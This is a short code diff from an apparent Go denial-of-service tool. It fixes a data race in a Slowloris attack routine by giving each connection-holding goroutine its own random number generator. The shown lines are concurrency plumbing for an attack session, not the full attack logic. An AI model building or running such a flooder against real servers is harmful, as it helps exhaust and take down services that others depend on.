@@ -54,17 +54,18 @@ func StartSlowlorisEx(cfg AttackConfig) *AttackSession {
 			wg.Add(1)
 			go func(seed int64) {
 				defer wg.Done()
-				rng := NewFastRNG(time.Now().UnixNano() + seed)
 				endTime := time.Now().Add(dur)
 				var targetIdx uint64
 
 				var slotWG sync.WaitGroup
 				for slot := 0; slot < slowSlotsPerThread; slot++ {
 					slotWG.Add(1)
-					go func() {
+					go func(slot int) {
 						defer slotWG.Done()
 						tc := newTimeCache()
 						var conn net.Conn
+						// 每槽独立 RNG：线程级 RNG 被多个槽并发使用是数据竞争
+						rng := NewFastRNG(time.Now().UnixNano() + seed + int64(slot)*7919)
 
 						for tc.since(endTime) < 0 {
 							select {
@@ -155,7 +156,7 @@ func StartSlowlorisEx(cfg AttackConfig) *AttackSession {
 						if conn != nil {
 							conn.Close()
 						}
-					}()
+					}(slot)
 				}
 				slotWG.Wait()
 			}(int64(i))
